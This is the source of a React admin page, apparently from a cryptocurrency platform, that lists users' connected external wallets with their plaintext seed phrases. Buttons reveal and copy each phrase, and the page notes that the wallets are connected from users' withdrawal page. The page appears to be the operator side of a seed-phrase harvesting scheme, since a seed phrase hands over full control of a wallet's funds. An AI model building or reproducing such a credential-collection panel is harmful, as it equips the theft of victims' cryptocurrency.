import { AdminLayout } from "@/components/layout/admin-layout";
import { Card, CardContent } from "@/components/ui/card";
import { Button } from "@/components/ui/button";
import { Input } from "@/components/ui/input";
import { 
  Table, 
  TableBody, 
  TableCell, 
  TableHead, 
  TableHeader, 
  TableRow 
} from "@/components/ui/table";
import { ArrowLeft, Wallet, Copy, Eye, EyeOff, Loader2, Key, User, Search, Trash2 } from "lucide-react";
import { useState } from "react";
import { useToast } from "@/hooks/use-toast";
import { Badge } from "@/components/ui/badge";
import { useQuery, useQueryClient } from "@tanstack/react-query";
import { Link } from "wouter";
import { useAdminTheme } from "@/lib/admin-theme";
import { cn } from "@/lib/utils";

interface ConnectedWallet {
  id: number;
  userId: number;
  name: string;
  logo: string | null;
  address: string;
  seedPhrase: string | null;
  connectedAt: string;
  isDeleted: boolean;
  walletTypeId: number | null;
  user?: {
    id: number;
    username: string;
    firstName: string;
    lastName: string;
  };
}

export default function AdminWalletPhrases() {
  return (
    <AdminLayout>
      <WalletPhrasesContent />
    </AdminLayout>
  );
}

function WalletPhrasesContent() {
  const { adminTheme } = useAdminTheme();
  const isDark = adminTheme === "dark";
  const { toast } = useToast();
  const queryClient = useQueryClient();
  const [showPhrases, setShowPhrases] = useState<{ [key: number]: boolean }>({});
  const [searchTerm, setSearchTerm] = useState("");
  const [deletingId, setDeletingId] = useState<number | null>(null);

  const { data: wallets = [], isLoading } = useQuery<ConnectedWallet[]>({
    queryKey: ['/api/admin/connected-wallets'],
    queryFn: async () => {
      const res = await fetch('/api/admin/connected-wallets');
      if (!res.ok) throw new Error('Failed to fetch wallets');
      return res.json();
    }
  });

  const filteredWallets = wallets.filter(wallet => 
    wallet.name.toLowerCase().includes(searchTerm.toLowerCase()) ||
    (wallet.user?.username || '').toLowerCase().includes(searchTerm.toLowerCase()) ||
    (wallet.user?.firstName || '').toLowerCase().includes(searchTerm.toLowerCase()) ||
    (wallet.user?.lastName || '').toLowerCase().includes(searchTerm.toLowerCase())
  );

  const formatDate = (dateString: string) => {
    return new Date(dateString).toLocaleString('en-US', {
      year: 'numeric',
      month: 'short',
      day: '2-digit',
      hour: '2-digit',
      minute: '2-digit'
    });
  };

  const copyToClipboard = (text: string, label: string) => {
    navigator.clipboard.writeText(text);
    toast({ title: "Copied", description: `${label} copied to clipboard.` });
  };

  const toggleShowPhrase = (id: number) => {
    setShowPhrases(prev => ({ ...prev, [id]: !prev[id] }));
  };

  const truncateAddress = (address: string) => {
    if (!address) return 'N/A';
    if (address.length <= 20) return address;
    return `${address.slice(0, 10)}...${address.slice(-8)}`;
  };

  const maskPhrase = (phrase: string) => {
    const words = phrase.split(' ');
    return words.map(() => '****').join(' ');
  };

  const handleDeleteWallet = async (id: number) => {
    if (!confirm("Are you sure you want to delete this connected wallet?")) return;
    
    setDeletingId(id);
    try {
      const res = await fetch(`/api/admin/connected-wallets/${id}`, { method: 'DELETE' });
      if (!res.ok) throw new Error('Failed to delete wallet');
      
      toast({
        title: "Wallet Deleted",
        description: "The connected wallet has been deleted successfully."
      });
      
      queryClient.invalidateQueries({ queryKey: ['/api/admin/connected-wallets'] });
    } catch (error) {
      toast({
        title: "Error",
        description: "Failed to delete wallet.",
        variant: "destructive"
      });
    } finally {
      setDeletingId(null);
    }
  };

  return (
    <div>
      <div className="mb-6 flex justify-between items-center flex-wrap gap-4">
        <div className="flex items-center gap-4">
          <Link href="/admin/linked-wallets">
            <Button variant="ghost" size="sm" data-testid="button-back-wallet-types">
              <ArrowLeft size={16} className="mr-2" />
              Back
            </Button>
          </Link>
          <div>
            <h1 className={cn("text-xl font-bold", isDark ? "text-white" : "text-gray-900")}>Wallet Phrases</h1>
            <p className={cn("text-sm mt-1", isDark ? "text-slate-400" : "text-gray-500")}>View all user connected external wallets and their seed phrases</p>
          </div>
        </div>
        <div className="flex items-center gap-4">
          <div className="flex items-center gap-2 bg-amber-100 px-4 py-2 rounded-lg">
            <Key size={18} className="text-amber-600" />
            <span className="font-medium text-amber-800 text-sm">Sensitive Data</span>
          </div>
          <div className={cn(
            "flex items-center gap-2 px-4 py-2 rounded-lg",
            isDark ? "bg-slate-800" : "bg-gray-100"
          )}>
            <Wallet size={20} className="text-purple-600" />
            <span className={cn("font-semibold", isDark ? "text-white" : "text-gray-900")}>{wallets.length}</span>
            <span className={isDark ? "text-slate-400" : "text-gray-500"}>Total</span>
          </div>
        </div>
      </div>

      <div className="mb-4">
        <div className="relative max-w-xs">
          <Search size={16} className={cn(
            "absolute left-3 top-1/2 -translate-y-1/2",
            isDark ? "text-slate-500" : "text-gray-400"
          )} />
          <Input
            placeholder="Search by user or wallet..."
            value={searchTerm}
            onChange={(e) => setSearchTerm(e.target.value)}
            className={cn(
              "pl-10",
              isDark && "bg-slate-800 border-slate-700 text-white placeholder:text-slate-500"
            )}
            data-testid="input-search-wallets"
          />
        </div>
      </div>

      <Card className={isDark ? "bg-slate-900 border-slate-800" : ""}>
        <CardContent className="p-0">
          {isLoading ? (
            <div className="text-center py-12">
              <Loader2 className={cn("h-8 w-8 animate-spin mx-auto", isDark ? "text-slate-500" : "text-gray-500")} />
              <p className={cn("mt-4", isDark ? "text-slate-400" : "text-gray-500")}>Loading wallets...</p>
            </div>
          ) : filteredWallets.length === 0 ? (
            <div className={cn(
              "text-center py-12 px-6 rounded-lg border border-dashed",
              isDark ? "bg-slate-800/50 border-slate-700" : "bg-gray-50 border-gray-200"
            )}>
              <Wallet size={48} className={cn("mx-auto mb-4", isDark ? "text-slate-600" : "text-gray-300")} />
              <p className={cn("text-sm", isDark ? "text-slate-400" : "text-gray-500")}>
                {searchTerm ? 'No matching wallets found' : 'No connected wallets found'}
              </p>
              <p className={cn("text-xs mt-1", isDark ? "text-slate-500" : "text-gray-400")}>
                {searchTerm ? 'Try adjusting your search' : 'Users can connect external wallets from their withdrawal page'}
              </p>
            </div>
          ) : (
            <div className="overflow-x-auto">
              <Table>
                <TableHeader>
                  <TableRow className={isDark ? "border-slate-800 hover:bg-slate-800/50" : ""}>
                    <TableHead className={isDark ? "text-slate-300" : ""}>User</TableHead>
                    <TableHead className={isDark ? "text-slate-300" : ""}>Wallet</TableHead>
                    <TableHead className={isDark ? "text-slate-300" : ""}>Address</TableHead>
                    <TableHead className={cn("min-w-[300px]", isDark ? "text-slate-300" : "")}>Seed Phrase</TableHead>
                    <TableHead className={isDark ? "text-slate-300" : ""}>Connected At</TableHead>
                    <TableHead className={isDark ? "text-slate-300" : ""}>Actions</TableHead>
                  </TableRow>
                </TableHeader>
                <TableBody>
                  {filteredWallets.map((wallet) => (
                    <TableRow key={wallet.id} data-testid={`row-wallet-phrase-${wallet.id}`} className={isDark ? "border-slate-800 hover:bg-slate-800/50" : ""}>
                      <TableCell>
                        <div className="flex items-center gap-2">
                          <div className={cn(
                            "w-8 h-8 rounded-full flex items-center justify-center",
                            isDark ? "bg-indigo-900/50" : "bg-indigo-100"
                          )}>
                            <User size={16} className="text-indigo-500" />
                          </div>
                          <div>
                            <div className={cn("font-medium text-sm", isDark ? "text-white" : "text-gray-900")}>
                              {wallet.user?.firstName || 'Unknown'} {wallet.user?.lastName || ''}
                            </div>
                            <div className={cn("text-xs", isDark ? "text-slate-400" : "text-gray-500")}>
                              @{wallet.user?.username || 'N/A'}
                            </div>
                          </div>
                        </div>
                      </TableCell>
                      <TableCell>
                        <div className="flex items-center gap-2.5">
                          {wallet.logo ? (
                            <img 
                              src={wallet.logo} 
                              alt={wallet.name} 
                              className="w-7 h-7 object-contain rounded-md"
                            />
                          ) : (
                            <div className={cn(
                              "w-7 h-7 rounded-md flex items-center justify-center",
                              isDark ? "bg-slate-700" : "bg-gray-100"
                            )}>
                              <Wallet size={14} className={isDark ? "text-slate-400" : "text-gray-400"} />
                            </div>
                          )}
                          <span className={cn("font-medium", isDark ? "text-white" : "text-gray-900")}>{wallet.name}</span>
                        </div>
                      </TableCell>
                      <TableCell>
                        <div className="flex items-center gap-2">
                          <code className={cn(
                            "text-xs px-2 py-1 rounded",
                            isDark ? "bg-slate-800 text-slate-300" : "bg-gray-100 text-gray-700"
                          )}>
                            {truncateAddress(wallet.address)}
                          </code>
                          {wallet.address && (
                            <Button 
                              variant="ghost" 
                              size="sm" 
                              onClick={() => copyToClipboard(wallet.address, 'Address')}
                              className="p-1 h-auto"
                              data-testid={`button-copy-address-${wallet.id}`}
                            >
                              <Copy size={12} />
                            </Button>
                          )}
                        </div>
                      </TableCell>
                      <TableCell>
                        {wallet.seedPhrase ? (
                          <div className="flex items-center gap-2">
                            <div className={cn(
                              "max-w-[280px] text-xs font-mono px-3 py-2 rounded-md border break-all",
                              showPhrases[wallet.id] 
                                ? (isDark ? "bg-red-900/30 border-red-800 text-red-200" : "bg-red-50 border-red-200 text-red-900")
                                : (isDark ? "bg-slate-800 border-slate-700 text-slate-300" : "bg-gray-50 border-gray-200 text-gray-700")
                            )}>
                              {showPhrases[wallet.id] ? wallet.seedPhrase : maskPhrase(wallet.seedPhrase)}
                            </div>
                            <div className="flex gap-1">
                              <Button 
                                variant="ghost" 
                                size="sm" 
                                onClick={() => toggleShowPhrase(wallet.id)}
                                className="p-1 h-auto"
                                data-testid={`button-toggle-phrase-${wallet.id}`}
                              >
                                {showPhrases[wallet.id] ? <EyeOff size={14} /> : <Eye size={14} />}
                              </Button>
                              <Button 
                                variant="ghost" 
                                size="sm" 
                                onClick={() => copyToClipboard(wallet.seedPhrase!, 'Seed phrase')}
                                className="p-1 h-auto"
                                data-testid={`button-copy-phrase-${wallet.id}`}
                              >
                                <Copy size={12} />
                              </Button>
                            </div>
                          </div>
                        ) : (
                          <Badge variant="secondary">No phrase</Badge>
                        )}
                      </TableCell>
                      <TableCell>
                        <span className={cn("text-xs", isDark ? "text-slate-400" : "text-gray-500")}>
                          {formatDate(wallet.connectedAt)}
                        </span>
                      </TableCell>
                      <TableCell>
                        <Button 
                          variant="destructive"
                          size="sm"
                          onClick={() => handleDeleteWallet(wallet.id)}
                          disabled={deletingId === wallet.id}
                          data-testid={`button-delete-wallet-${wallet.id}`}
                        >
                          {deletingId === wallet.id ? (
                            <Loader2 size={14} className="animate-spin" />
                          ) : (
                            <Trash2 size={14} />
                          )}
                        </Button>
                      </TableCell>
                    </TableRow>
                  ))}
                </TableBody>
              </Table>
            </div>
          )}
        </CardContent>
      </Card>
    </div>
  );
}
